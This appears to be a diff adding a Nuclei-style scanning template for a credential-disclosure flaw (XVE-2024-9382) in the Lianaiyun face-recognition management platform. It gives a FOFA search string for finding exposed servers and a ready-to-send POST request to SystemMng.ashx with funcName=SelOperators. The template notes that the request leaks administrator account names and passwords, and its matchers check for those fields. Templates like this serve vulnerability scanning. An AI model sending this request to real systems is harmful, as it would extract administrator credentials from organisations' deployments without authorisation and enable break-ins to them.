@@ -1,0 +1,32 @@
+id: lianaiyun-SystemMng-Information-disclosure
+
+info:
+  name: 脸爱云一脸通智慧管理平台 SystemMng 管理用户信息泄露漏洞(XVE-2024-9382)
+  author: unknown
+  severity: high
+  description: |-
+    fofa: body="View/UserReserved/UserReservedTest.aspx"
+    脸爱云一脸通智慧管理平台存在信息泄露漏洞，该漏洞源于SystemMng.ashx接口处存在信息泄露漏洞，攻击者能够利用该漏洞通过SelOperators参数泄露的当前管理员的敏感信息，包括账号密码登录系统后台。
+  reference:
+    - https://blog.csdn.net/m0_60571842/article/details/139940178
+  tags: Information disclosure
+
+http:
+  - raw:
+      - |
+        POST /SystemMng.ashx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+        username=admin&funcName=SelOperators
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'username'
+          - 'password'
+      - type: status
+        status: 
+          - 200
